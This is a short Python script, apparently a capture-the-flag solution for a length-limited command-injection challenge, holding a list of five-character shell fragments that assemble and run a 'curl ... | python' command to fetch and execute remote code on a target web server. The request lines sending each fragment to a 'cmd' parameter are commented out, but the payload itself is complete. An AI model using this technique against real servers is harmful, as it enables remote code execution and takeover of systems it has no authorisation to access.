'''
Author: yhh
Date: 2022-09-29 09:55:56
LastEditTime: 2022-09-29 09:57:16
LastEditors: yhh
Description: 
FilePath: \PythonFile\orange_RFC.py
yhh
'''
import requests
from time import sleep
# from urllib import quote
payload = [
    # generate `ls -t>g` file
    '>ls\\', 
    'ls>_', 
    '>\ \\', 
    '>-t\\', 
    '>\>g', 
    'ls>>_', 
    # generate `curl orange.tw.tw>python`
    # curl shell.0xb.pw|python
    '>on', 
    '>th\\', 
    '>py\\',
    '>\|\\', 
    '>pw\\', 
    '>x.\\',
    '>xx\\', 
    '>l.\\', 
    '>el\\', 
    '>sh\\', 
    '>\ \\', 
    '>rl\\', 
    '>cu\\', 
    # exec
    'sh _', 
    'sh g', 
]
# r = requests.get('http://xxx/web1.php/?reset=1')
for i in payload:
    assert len(i) <= 5 
    # r = requests.get('http://xxx/web1.php/?cmd=' + quote(i) )
    print(i)
    sleep(0.2)